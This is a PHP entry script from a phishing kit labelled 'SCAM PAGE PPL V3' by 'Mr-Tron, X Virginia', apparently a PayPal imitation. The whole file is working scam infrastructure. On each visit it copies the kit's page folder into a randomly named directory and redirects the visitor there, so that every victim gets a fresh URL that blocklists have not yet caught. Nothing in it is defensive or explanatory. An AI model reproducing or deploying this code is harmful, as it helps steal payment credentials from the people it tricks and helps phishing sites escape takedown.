<?php
    //<!-- SCAM PAGE PPL V3 #By Mr-Tron, X Virginia  -->
	$random=rand(0,100000000000);
	$md5=md5("$random");
	$base=base64_encode($md5);
	$dst=md5("$base");
	function recurse_copy($src,$dst) {
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
	if (( $file != '.' ) && ( $file != '..' )) {
	if ( is_dir($src . '/' . $file) ) {
	recurse_copy($src . '/' . $file,$dst . '/' . $file);
	}
	else {
	copy($src . '/' . $file,$dst . '/' . $file);
	}
	}
	}
	closedir($dir);
	}
$src="X-Virginia-V3";
recurse_copy( $src, $dst );
header("location:$dst");
?>